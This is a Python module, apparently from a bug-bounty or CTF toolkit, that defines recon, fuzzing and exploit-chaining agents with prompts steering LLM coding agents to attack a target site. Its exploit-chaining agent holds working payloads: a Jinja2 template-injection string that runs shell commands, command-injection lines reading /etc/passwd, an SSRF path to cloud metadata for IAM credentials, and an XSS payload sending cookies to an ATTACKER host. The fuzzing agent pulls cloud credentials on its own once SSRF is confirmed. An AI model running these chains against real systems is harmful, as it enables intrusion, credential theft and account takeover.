"""Agent definitions for multi-agent security testing.

Each agent has a specialized role and receives context from:
- RAG knowledge base (methodology docs)
- ScannerDB (shared findings state)
- Previous phase results

Agents can be spawned via the internal task() system or via
external CLI tools (claude-code, codex-cli).

Usage:
    from bugbounty_ctf.agents import ReconAgent, FuzzAgent

    recon = ReconAgent(scanner, knowledge_base)
    result = recon.run()
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from bugbounty_ctf.engine import SecurityScanner
from bugbounty_ctf.knowledge import KnowledgeBase


@dataclass
class AgentContext:
    """Shared context passed to all agents."""

    scanner: SecurityScanner
    knowledge_base: KnowledgeBase
    target_url: str
    tech_hints: list[str] = field(default_factory=list)
    findings: list[dict[str, Any]] = field(default_factory=list)
    surface: dict[str, Any] = field(default_factory=dict)
    methodology: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class AgentResult:
    """Result from a single agent."""

    agent_name: str
    findings: list[dict[str, Any]] = field(default_factory=list)
    recommendations: list[str] = field(default_factory=list)
    data: dict[str, Any] = field(default_factory=dict)


class BaseAgent:
    """Base class for all security testing agents."""

    name: str = "base"
    role: str = ""

    def __init__(self, context: AgentContext) -> None:
        self.context = context
        self.scanner = context.scanner
        self.kb = context.knowledge_base

    def build_prompt(self) -> str:
        """Build the agent prompt with RAG context and scanner state."""
        raise NotImplementedError

    def run(self) -> AgentResult:
        """Execute the agent's task."""
        raise NotImplementedError

    def get_rag_context(self, query: str) -> str:
        """Query the knowledge base and format results for prompt injection."""
        results = self.kb.search(query, limit=5)
        if not results:
            return ""

        lines = ["Relevant methodology from knowledge base:"]
        for r in results:
            lines.append(f"  - {r['filename']} → {r['section']}")
            lines.append(f"    {r['snippet'][:150]}")
        return "\n".join(lines)

    def get_scanner_state(self) -> str:
        """Format current scanner state for prompt injection."""
        summary = self.scanner.get_summary()
        lines = [
            f"Target: {summary['target']}",
            f"Tests run: {summary['tests_run']}",
            f"Findings: {summary['findings_count']}",
            f"WAF detected: {summary['waf_detected']}",
        ]
        if self.context.tech_hints:
            lines.append(f"Tech stack: {', '.join(self.context.tech_hints)}")
        if self.context.findings:
            lines.append(f"Previous findings: {len(self.context.findings)}")
            for f in self.context.findings[:5]:
                lines.append(f"  - {f.get('type', '?')}: {f.get('endpoint', '?')}")
        return "\n".join(lines)


class ReconAgent(BaseAgent):
    """Maps the attack surface: forms, links, tech stack, defenses."""

    name = "recon"
    role = "reconnaissance"

    def build_prompt(self) -> str:
        rag = self.get_rag_context("web reconnaissance methodology attack surface mapping")
        return f"""You are a security reconnaissance agent. Your job is to map the attack surface of {self.context.target_url}.

{self.get_scanner_state()}

{rag}

Tasks:
1. Fetch the homepage and extract all forms, links, and input points
2. Identify the technology stack from headers and cookies
3. Detect WAF, rate limiting, and input filters
4. Enumerate common paths (/admin, /api, /login, etc.)
5. Check for AWS/cloud metadata endpoints

Use the bugbounty_ctf toolkit:
  scanner.map_surface("/")  # maps forms, links, tech
  detect_defenses(base_url, scanner=scanner)  # WAF/rate limit detection
  scanner._make_request("GET", url)  # fetch any URL

Report all discovered endpoints, forms, parameters, and tech hints."""

    def run(self) -> AgentResult:
        result = AgentResult(agent_name=self.name)

        surface = self.scanner.map_surface("/")
        result.data["surface"] = surface

        self.context.surface = surface
        self.context.tech_hints = surface.get("tech_hints", [])

        all_forms = surface.get("forms", [])
        all_links = surface.get("links", [])

        crawled = {self.context.target_url + "/"}
        to_crawl = [link for link in all_links if link not in crawled]

        for link in to_crawl[:10]:
            if link in crawled:
                continue
            crawled.add(link)
            sub_surface = self.scanner.map_surface(link.replace(self.context.target_url, ""))
            all_forms.extend(sub_surface.get("forms", []))
            all_links.extend(sub_surface.get("links", []))
            self.context.tech_hints.extend(sub_surface.get("tech_hints", []))

        self.context.tech_hints = list(set(self.context.tech_hints))
        result.data["surface"]["forms"] = all_forms
        result.data["surface"]["links"] = list(set(all_links))

        for form in all_forms:
            result.recommendations.append(
                f"Form: {form['method']} {form['action']} → {[i['name'] for i in form['inputs']]}"
            )

        for link in list(set(all_links)):
            result.recommendations.append(f"Endpoint: {link}")

        return result


class ResearchAgent(BaseAgent):
    """Queries the RAG knowledge base for relevant methodology."""

    name = "research"
    role = "methodology research"

    def build_prompt(self) -> str:
        tech = ", ".join(self.context.tech_hints) if self.context.tech_hints else "generic web"
        rag = self.get_rag_context(f"{tech} vulnerability exploitation methodology")
        return f"""You are a security research agent. Your job is to find relevant methodology for testing {self.context.target_url}.

{self.get_scanner_state()}

Tech stack: {tech}

{rag}

Tasks:
1. Query the knowledge base for methodology relevant to the detected tech stack
2. Identify which vulnerability classes to test based on the tech
3. Recommend specific payloads and techniques from the reference docs
4. Suggest an attack priority order

Use the bugbounty_ctf knowledge base:
  kb.search("SQL injection bypass")
  kb.suggest_methodology(["nginx", "Flask", "PHP"])

Report methodology recommendations and attack priority."""

    def run(self) -> AgentResult:
        result = AgentResult(agent_name=self.name)

        if self.context.tech_hints:
            suggestions = self.kb.suggest_methodology(self.context.tech_hints)
        else:
            suggestions = self.kb.search("web vulnerability testing")

        result.data["methodology"] = suggestions
        self.context.methodology = suggestions

        for s in suggestions[:10]:
            result.recommendations.append(
                f"Consult {s['filename']} → {s['section']}: {s['snippet'][:100]}"
            )

        return result


class FuzzAgent(BaseAgent):
    """Tests payloads against discovered endpoints."""

    name = "fuzz"
    role = "payload fuzzing"

    def build_prompt(self) -> str:
        rag = self.get_rag_context("payload testing SQLi XSS SSTI SSRF command injection")
        endpoints = [f.get("endpoint", "?") for f in self.context.findings]
        return f"""You are a security fuzzing agent. Your job is to test payloads against endpoints on {self.context.target_url}.

{self.get_scanner_state()}

Endpoints to test:
{chr(10).join(f"  - {e}" for e in endpoints)}

Methodology context:
{rag}

Tasks:
1. For each endpoint, run the appropriate test functions
2. Compare responses to baselines — differences indicate vulnerabilities
3. Record confirmed vulnerabilities with their indicators
4. Escalate payloads (e.g., XSS filter bypass ladder)

Use the bugbounty_ctf toolkit:
  scanner.scan_endpoint(url)  # auto-runs SQLi, SSTI, CMDi, XSS, LFI
  test_login_sqli(url, scanner=scanner)
  test_ssti(url, scanner=scanner)
  test_xss(url, scanner=scanner)
  test_ssrf(url, scanner=scanner)  # add url_suffix=... only if the target filter requires an extension
  test_idor(url_template, scanner=scanner)

Report all confirmed vulnerabilities with their payload, indicators, and endpoint."""

    def run(self) -> AgentResult:
        result = AgentResult(agent_name=self.name)

        surface = self.context.surface
        links = surface.get("links", [])
        forms = surface.get("forms", [])

        tested_endpoints: set[str] = set()

        for form in forms:
            endpoint = form["action"]
            if endpoint in tested_endpoints:
                continue
            tested_endpoints.add(endpoint)

            form_params = {inp["name"]: "test" for inp in form["inputs"]}
            if form["method"] == "POST":
                results = self.scanner.scan_endpoint(endpoint, method="POST", data=form_params)
            else:
                results = self.scanner.scan_endpoint(endpoint, method="GET", params=form_params)
            self._collect_findings(result, endpoint, results)

            url_params = [inp["name"] for inp in form["inputs"] if "url" in inp["name"].lower()]
            for url_param in url_params:
                self._test_ssrf(result, endpoint, form["method"], url_param)

        for link in links:
            if link in tested_endpoints:
                continue
            if not any(
                k in link
                for k in ["login", "search", "api", "upload", "submit", "preview", "jobs", "admin"]
            ):
                continue
            tested_endpoints.add(link)
            results = self.scanner.scan_endpoint(link, method="GET", params={"q": "test"})
            self._collect_findings(result, link, results)

        return result

    def _test_ssrf(self, result: AgentResult, endpoint: str, method: str, param_name: str) -> None:
        """Test for SSRF on a URL-accepting parameter."""
        from bugbounty_ctf.quick_tests import test_ssrf as _test_ssrf_fn

        try:
            ssrf_results = _test_ssrf_fn(
                endpoint,
                method=method,
                param_name=param_name,
                scanner=self.scanner,
            )
            for r in ssrf_results:
                if r.get("interesting"):
                    finding = {
                        "type": "ssrf",
                        "endpoint": endpoint,
                        "payload": r.get("payload", ""),
                        "indicators": r.get("analysis", {}).get("indicators", []),
                        "details": r.get("analysis", {}).get("differences", []),
                    }
                    result.findings.append(finding)
                    self.context.findings.append(finding)
                    self._try_metadata_extraction(result)
        except Exception:
            pass

    def _try_metadata_extraction(self, result: AgentResult) -> None:
        """Attempt AWS metadata extraction if SSRF is confirmed."""
        from bugbounty_ctf.engine import get_aws_credentials

        try:
            creds = get_aws_credentials(self.scanner)
            if creds:
                finding = {
                    "type": "aws_credentials",
                    "endpoint": "metadata-service",
                    "payload": "2852039166 (decimal IP bypass)",
                    "indicators": ["iam_credentials_leaked"],
                    "details": [f"AccessKeyId: {creds.get('AccessKeyId', '?')}"],
                }
                result.findings.append(finding)
                self.context.findings.append(finding)
        except Exception:
            pass

    @staticmethod
    def _collect_findings(
        result: AgentResult,
        endpoint: str,
        results: dict[str, Any],
    ) -> None:
        for vuln_type, test_results in results.items():
            for tr in test_results:
                if tr.confirmed:
                    finding = {
                        "type": vuln_type,
                        "endpoint": endpoint,
                        "payload": tr.payload,
                        "indicators": tr.indicators,
                        "details": tr.details,
                    }
                    result.findings.append(finding)


class ExploitAgent(BaseAgent):
    """Chains confirmed findings into exploit paths."""

    name = "exploit"
    role = "exploit chaining"

    def build_prompt(self) -> str:
        rag = self.get_rag_context("exploit chain privilege escalation lateral movement")
        findings_summary = "\n".join(
            f"  - {f.get('type', '?')}: {f.get('endpoint', '?')} ({f.get('payload', '?')})"
            for f in self.context.findings
        )
        return f"""You are an exploit chaining agent. Your job is to combine confirmed vulnerabilities into exploit paths for {self.context.target_url}.

{self.get_scanner_state()}

Confirmed vulnerabilities:
{findings_summary}

Methodology context:
{rag}

Tasks:
1. Identify which vulnerabilities can be chained
2. Map the exploit path (e.g., SSRF → metadata → credentials → STS)
3. Determine what each chain gives you (data access, RCE, privilege escalation)
4. Suggest next steps for each chain

Common chains:
  SSRF → AWS metadata → IAM credentials → STS/S3 access
  SQLi → credential dump → authenticated access → admin panel
  XSS → session theft → account takeover
  SSTI → RCE → filesystem read → flag/credentials
  File upload → webshell → RCE

Report exploit chains with steps and expected outcomes."""

    def run(self) -> AgentResult:
        result = AgentResult(agent_name=self.name)

        findings = self.context.findings

        chains: list[dict[str, Any]] = []

        sqli = [f for f in findings if "sqli" in f.get("type", "").lower()]
        ssrf = [f for f in findings if "ssrf" in f.get("type", "").lower()]
        ssti = [f for f in findings if "ssti" in f.get("type", "").lower()]
        cmdi = [f for f in findings if "cmdi" in f.get("type", "").lower()]
        xss = [f for f in findings if "xss" in f.get("type", "").lower()]

        if sqli:
            chains.append(
                {
                    "name": "SQLi → data exfiltration",
                    "steps": [
                        f"SQLi at {sqli[0]['endpoint']}",
                        "UNION SELECT to dump schema",
                        "Extract credentials",
                        "Login with stolen credentials",
                    ],
                }
            )

        if ssrf:
            chains.append(
                {
                    "name": "SSRF → cloud metadata → credential theft",
                    "steps": [
                        f"SSRF at {ssrf[0]['endpoint']}",
                        "Access 169.254.169.254 via decimal IP (2852039166)",
                        "Get IAM credentials from /latest/meta-data/iam/security-credentials/",
                        "Use credentials to access STS/S3/SQS",
                    ],
                }
            )

        if ssti:
            chains.append(
                {
                    "name": "SSTI → RCE",
                    "steps": [
                        f"SSTI at {ssti[0]['endpoint']}",
                        "Jinja2 RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                        "Read /etc/passwd, environment variables",
                        "Find and read flag file",
                    ],
                }
            )

        if cmdi:
            chains.append(
                {
                    "name": "CMDi → RCE",
                    "steps": [
                        f"Command injection at {cmdi[0]['endpoint']}",
                        "Execute: id; whoami; cat /etc/passwd",
                        "Enumerate filesystem: find / -name 'flag*'",
                        "Read flag file",
                    ],
                }
            )

        if xss:
            chains.append(
                {
                    "name": "XSS → session theft",
                    "steps": [
                        f"XSS at {xss[0]['endpoint']}",
                        "Start callback_listener.py on attacker IP",
                        "Inject payload: <img src=x onerror='fetch(\"http://ATTACKER:8888/\"+document.cookie)'>",
                        "Use captured session cookie for impersonation",
                    ],
                }
            )

        result.data["chains"] = chains
        for chain in chains:
            result.recommendations.append(f"Chain: {chain['name']} ({len(chain['steps'])} steps)")

        return result


def create_agent(agent_name: str, context: AgentContext) -> BaseAgent:
    """Factory function to create an agent by name."""
    agents = {
        "recon": ReconAgent,
        "research": ResearchAgent,
        "fuzz": FuzzAgent,
        "exploit": ExploitAgent,
    }
    if agent_name not in agents:
        raise ValueError(f"Unknown agent: {agent_name}. Available: {list(agents.keys())}")
    return agents[agent_name](context)
